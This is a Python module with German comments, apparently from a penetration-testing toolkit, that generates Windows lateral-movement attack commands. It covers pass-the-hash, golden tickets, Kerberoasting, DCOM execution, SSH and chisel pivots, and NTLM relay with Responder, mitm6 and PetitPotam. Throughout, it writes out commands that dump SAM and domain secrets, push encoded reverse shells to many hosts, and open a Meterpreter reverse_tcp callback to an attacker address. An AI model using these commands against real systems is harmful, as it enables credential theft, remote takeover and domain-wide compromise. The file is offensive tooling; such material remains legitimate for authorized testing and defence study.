"""
Lateral Movement Wizard — automatisierter Angriffs-Pivot nach erstem Shell.

Gegeben: Credentials (Hash oder Passwort) + Zielnetzwerk
Ergebnis: Fertige Befehle für alle Pivot-Methoden + auto-erkannte Technik

Techniken:
  1. Pass-the-Hash (PTH)      — NTLM Hash direkt nutzen ohne Cracking
  2. Pass-the-Ticket (PTT)    — Kerberos Ticket injizieren (Rubeus)
  3. SMBExec                  — Pseudo-Shell via SMB Named Pipe
  4. WMIExec                  — Shell via WMI (lautlos, kein Service)
  5. PSExec                   — Shell via Service-Installation (laut, AV-erkannt)
  6. AtExec                   — Befehl via at.exe / Scheduled Task
  7. DCOM Exec                — Shell via DCOM (MMC20, ShellWindows)
  8. Auto-Chain               — spray → hash → exec → escalate
  9. Network Pivot Setup      — sshuttle / proxychains via kompromittiertem Host
  10. RDP Pass-the-Hash       — RDP-Login mit Hash (Restricted Admin Mode)

Alle via impacket (Python) — auf Kali vorinstalliert.
"""

from __future__ import annotations
from typing import AsyncGenerator


# ── Pass-the-Hash ────────────────────────────────────────────────────────────

def pth_commands(
    target: str,
    domain: str,
    username: str,
    lm_hash: str,
    nt_hash: str,
    kali_ip: str = "10.10.10.1",
    lport: int = 4444,
) -> dict[str, str]:
    """
    Generiert alle Pass-the-Hash Methoden für gegebene Credentials.
    lm_hash = 'aad3b435b51404eeaad3b435b51404ee' wenn kein LM-Hash bekannt.
    """
    hashes = f"{lm_hash}:{nt_hash}"
    cred   = f"{domain}/{username}"

    return {
        "smbexec (Shell via SMB)": (
            f"impacket-smbexec {cred}@{target} -hashes {hashes}"
        ),
        "wmiexec (lautlos, kein Service)": (
            f"impacket-wmiexec {cred}@{target} -hashes {hashes}"
        ),
        "psexec (schnell, AV-erkannt)": (
            f"impacket-psexec {cred}@{target} -hashes {hashes}"
        ),
        "atexec (einzelner Befehl)": (
            f"impacket-atexec {cred}@{target} -hashes {hashes} 'whoami'"
        ),
        "secretsdump (alle Hashes dumpen)": (
            f"impacket-secretsdump {cred}@{target} -hashes {hashes}"
        ),
        "netexec smb (spray + enum)": (
            f"netexec smb {target} -u {username} -H {nt_hash} -d {domain} --shares"
        ),
        "netexec exec (Befehl ausführen)": (
            f"netexec smb {target} -u {username} -H {nt_hash} -d {domain} -x 'whoami'"
        ),
        "netexec dump SAM": (
            f"netexec smb {target} -u {username} -H {nt_hash} -d {domain} --sam"
        ),
        "evil-winrm (PS-Shell, Port 5985)": (
            f"evil-winrm -i {target} -u {username} -H {nt_hash}"
        ),
        "RDP Restricted Admin (kein PW nötig)": (
            f"xfreerdp /v:{target} /u:{username} /pth:{nt_hash} /cert:ignore /dynamic-resolution"
        ),
        "Meterpreter via MSF": (
            f"msfconsole -q -x \"use exploit/windows/smb/psexec; "
            f"set RHOSTS {target}; set SMBUser {username}; set SMBDomain {domain}; "
            f"set SMBPass {hashes}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
            f"set LHOST {kali_ip}; set LPORT {lport}; run\""
        ),
    }


async def pth_wizard(
    target: str,
    domain: str,
    username: str,
    nt_hash: str,
    kali_ip: str = "10.10.10.1",
) -> AsyncGenerator[str, None]:
    """Interaktiver PTH-Wizard: prüft Methoden und zeigt fertige Befehle."""
    lm = "aad3b435b51404eeaad3b435b51404ee"
    cmds = pth_commands(target, domain, username, lm, nt_hash, kali_ip)

    yield f"\033[1;36m[*] Pass-the-Hash — {username}@{target}\033[0m"
    yield f"\033[90m    Hash: {nt_hash}\033[0m\n"

    for method, cmd in cmds.items():
        yield f"\033[33m[→] {method}:\033[0m"
        yield f"\033[36m    {cmd}\033[0m"
        yield ""


# ── Pass-the-Ticket (Rubeus / ticketer) ──────────────────────────────────────

def ptt_commands(
    target: str,
    domain: str,
    username: str,
    krbtgt_hash: str = "",
    ticket_file: str = "",
    dc_ip: str = "",
) -> dict[str, str]:
    """
    Pass-the-Ticket und Golden/Silver Ticket via Rubeus (auf Ziel) oder ticketer (Kali).
    """
    cmds: dict[str, str] = {}

    if ticket_file:
        cmds["Rubeus: Ticket injizieren (auf Ziel)"] = (
            f"Rubeus.exe ptt /ticket:{ticket_file}"
        )
        cmds["Impacket: Ticket nutzen (auf Kali)"] = (
            f"KRB5CCNAME={ticket_file} impacket-wmiexec -k -no-pass {domain}/{username}@{target}"
        )

    if krbtgt_hash and dc_ip:
        cmds["Golden Ticket generieren (impacket)"] = (
            f"impacket-ticketer -nthash {krbtgt_hash} -domain-sid <SID> "
            f"-domain {domain} Administrator"
        )
        cmds["Golden Ticket injizieren (Rubeus)"] = (
            f"Rubeus.exe golden /rc4:{krbtgt_hash} /domain:{domain} "
            f"/sid:<Domain-SID> /user:Administrator /ptt"
        )
        cmds["DCSync mit Golden Ticket"] = (
            f"KRB5CCNAME=Administrator.ccache impacket-secretsdump "
            f"-k -no-pass {domain}/Administrator@{target}"
        )

    cmds["Ticket aus LSASS extrahieren (Rubeus)"] = (
        "Rubeus.exe dump /nowrap /service:krbtgt"
    )
    cmds["Kerberoast (alle SPNs)"] = (
        f"impacket-GetUserSPNs {domain}/{username} -dc-ip {dc_ip or target} "
        f"-request -outputfile kerberoast.hashes"
    )
    cmds["AS-REP Roast (kein Preauth)"] = (
        f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip or target} "
        f"-no-pass -usersfile users.txt -format hashcat"
    )

    return cmds


# ── DCOM Exec ────────────────────────────────────────────────────────────────

def dcom_exec_commands(target: str, domain: str, username: str, password: str) -> dict[str, str]:
    """
    DCOM-basierte Remote-Ausführung — kein Service-Install, kein SMB-Login-Event.
    Mehrere DCOM-Objekte als Methoden.
    """
    cred = f"{domain}/{username}:{password}"
    return {
        "MMC20.Application (impacket dcomexec)": (
            f"impacket-dcomexec {cred}@{target} 'whoami' -object MMC20"
        ),
        "ShellWindows": (
            f"impacket-dcomexec {cred}@{target} 'whoami' -object ShellWindows"
        ),
        "ShellBrowserWindow": (
            f"impacket-dcomexec {cred}@{target} 'whoami' -object ShellBrowserWindow"
        ),
        "PowerShell DCOM (lokal)": (
            "$com = [Type]::GetTypeFromProgID('MMC20.Application','" + target + "'); "
            "$obj = [Activator]::CreateInstance($com); "
            "$obj.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami > C:\\\\Windows\\\\Temp\\\\o.txt','7')"
        ),
    }


# ── Network Pivot (sshuttle / proxychains) ───────────────────────────────────

def pivot_setup(
    pivot_ip: str,
    pivot_user: str = "root",
    ssh_key: str = "",
    target_subnet: str = "192.168.1.0/24",
) -> dict[str, str]:
    """
    Netzwerk-Pivot via SSH-Tunnel oder sshuttle.
    Voraussetzung: SSH-Zugang zum kompromittierten Host.
    """
    key_arg = f"-i {ssh_key}" if ssh_key else ""
    return {
        "sshuttle (transparent Proxy, empfohlen)": (
            f"sshuttle -r {pivot_user}@{pivot_ip} {target_subnet} {key_arg} --dns"
        ),
        "SSH Dynamic SOCKS Proxy": (
            f"ssh {key_arg} -D 1080 -fN {pivot_user}@{pivot_ip}\n"
            f"# proxychains.conf: socks5 127.0.0.1 1080\n"
            f"# Dann: proxychains nmap -sT {target_subnet}"
        ),
        "SSH Remote Port Forward (Reverse Shell zurück)": (
            f"ssh {key_arg} -R 4444:localhost:4444 {pivot_user}@{pivot_ip}"
        ),
        "Chisel Tunnel (wenn kein SSH)": (
            f"# Kali:  chisel server -p 9999 --reverse\n"
            f"# Ziel:  chisel client <kali-ip>:9999 R:socks"
        ),
        "ligolo-ng (moderner Pivot, empfohlen)": (
            f"# Kali:  ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n"
            f"# Ziel:  ligolo-agent -connect <kali-ip>:11601 -ignore-cert"
        ),
        "proxychains Konfiguration": (
            "# /etc/proxychains4.conf:\n"
            "strict_chain\n"
            "proxy_dns\n"
            "[ProxyList]\n"
            "socks5  127.0.0.1 1080"
        ),
    }


# ── Auto-Lateral-Chain ────────────────────────────────────────────────────────

async def auto_lateral_chain(
    targets: list[str],
    domain: str,
    username: str,
    nt_hash: str,
    kali_ip: str,
    lport: int = 4444,
) -> AsyncGenerator[str, None]:
    """
    Vollautomatische Lateral Movement Chain:
    Spray → PTH → Exec → Dump → Repeat

    Für jedes Ziel: prüft SMB-Erreichbarkeit, führt PTH aus,
    dumpt Hashes, generiert nächsten Schritt.
    """
    yield "\033[1;31m[*] AUTO LATERAL MOVEMENT CHAIN\033[0m"
    yield f"\033[90m    Domain: {domain} | User: {username}\033[0m"
    yield f"\033[90m    Ziele: {', '.join(targets[:5])}{'...' if len(targets) > 5 else ''}\033[0m\n"

    yield "\033[33m[Phase 1] SMB-Erreichbarkeit + Authentifizierung prüfen:\033[0m"
    target_list = " ".join(targets)
    yield f"\033[36m  netexec smb {target_list} -u {username} -H {nt_hash} -d {domain}\033[0m"
    yield ""

    yield "\033[33m[Phase 2] Hashes von erreichbaren Zielen dumpen:\033[0m"
    for t in targets[:3]:
        yield f"\033[36m  netexec smb {t} -u {username} -H {nt_hash} -d {domain} --sam\033[0m"
    if len(targets) > 3:
        yield f"\033[36m  # ... + {len(targets)-3} weitere Ziele\033[0m"
    yield ""

    yield "\033[33m[Phase 3] Reverse Shell auf alle erreichbaren Ziele:\033[0m"
    yield f"\033[36m  netexec smb {target_list} -u {username} -H {nt_hash} -d {domain} \\\033[0m"
    yield f"\033[36m    -x 'powershell -enc <base64_revshell>'\033[0m"
    yield ""

    yield "\033[33m[Phase 4] Secrets-Dump (alle Credentials in einem Lauf):\033[0m"
    for t in targets[:3]:
        yield (
            f"\033[36m  impacket-secretsdump {domain}/{username}@{t} "
            f"-hashes aad3b435b51404eeaad3b435b51404ee:{nt_hash}\033[0m"
        )
    yield ""

    yield "\033[33m[Phase 5] Domain-Admin Suche (BloodHound-Daten):\033[0m"
    yield f"\033[36m  bloodhound-python -u {username} -p '' --hashes {nt_hash} \\\033[0m"
    yield f"\033[36m    -d {domain} -c All --zip\033[0m"
    yield f"\033[36m  # Dann: BloodHound öffnen → 'Shortest Path to Domain Admin'\033[0m"
    yield ""

    yield "\033[32m[*] Chain generiert. Starte mit Phase 1 und eskaliere Schritt für Schritt.\033[0m"


# ── NTLM Relay Wizard ────────────────────────────────────────────────────────

def ntlm_relay_wizard(
    target: str,
    interface: str = "eth0",
    relay_target: str = "",
    loot_dir: str = "~/penkit-output/relay",
) -> dict[str, str]:
    """
    Vollständiger NTLM-Relay-Setup:
    Responder (Poison) + ntlmrelayx (Relay) gleichzeitig.
    Ziel: Credentials sammeln ODER direkt Shell/DCSync triggern.
    """
    relay_t = relay_target or target
    return {
        "1) Responder starten (Terminal 1)": (
            f"# SMB + HTTP poisoning, aber kein eigener SMB/HTTP-Server\n"
            f"responder -I {interface} -rdw -v --lm\n"
            f"# Config: /etc/responder/Responder.conf → SMB = Off, HTTP = Off"
        ),
        "2a) ntlmrelayx → Shell (Terminal 2)": (
            f"impacket-ntlmrelayx -t smb://{relay_t} -smb2support -i"
            f"\n# Dann: nc 127.0.0.1 11000  (interactive shell)"
        ),
        "2b) ntlmrelayx → Command exec": (
            f"impacket-ntlmrelayx -t smb://{relay_t} -smb2support "
            f"-c 'powershell -enc <base64_revshell>'"
        ),
        "2c) ntlmrelayx → DCSync (auf DC relayieren)": (
            f"impacket-ntlmrelayx -t ldap://{relay_t} -smb2support "
            f"--escalate-user {target} --dump-laps --dump-adcs"
        ),
        "2d) ntlmrelayx → Shadow Credentials (ADCS)": (
            f"impacket-ntlmrelayx -t ldaps://{relay_t} --shadow-credentials "
            f"--shadow-target 'TARGET$'"
        ),
        "3) mitm6 (IPv6 Poisoning, zuverlässiger als Responder)": (
            f"mitm6 -d <domain> -i {interface}\n"
            f"# Kombiniert mit: impacket-ntlmrelayx -6 -t ldaps://{relay_t} "
            f"-wh fakewpad.domain.local --delegate-access"
        ),
        "4) Coercion (Auth erzwingen, kein Warten)": (
            f"# PetitPotam (LSA Coerce):\n"
            f"impacket-PetitPotam.py -u '' -p '' {relay_t} {target}\n"
            f"\n# PrinterBug (SpoolSS):\n"
            f"impacket-printerbug.py {target}/guest@ {relay_t}"
        ),
        "Output / Loot": (
            f"mkdir -p {loot_dir}\n"
            f"# ntlmrelayx speichert Hashes automatisch\n"
            f"# Hashes cracken: hashcat -m 5600 {loot_dir}/hashes.txt /usr/share/wordlists/rockyou.txt"
        ),
    }


async def show_ntlm_relay_wizard(
    interface: str,
    target: str,
    relay_target: str = "",
) -> AsyncGenerator[str, None]:
    yield "\033[1;36m[*] NTLM Relay Wizard\033[0m"
    yield f"\033[90m    Interface: {interface} | Ziel: {target}\033[0m\n"

    steps = ntlm_relay_wizard(target, interface, relay_target)
    for step, cmd in steps.items():
        yield f"\033[33m{step}:\033[0m"
        for line in cmd.split("\n"):
            prefix = "\033[90m  #" if line.strip().startswith("#") else "\033[36m  "
            yield f"{prefix}{line}\033[0m"
        yield ""
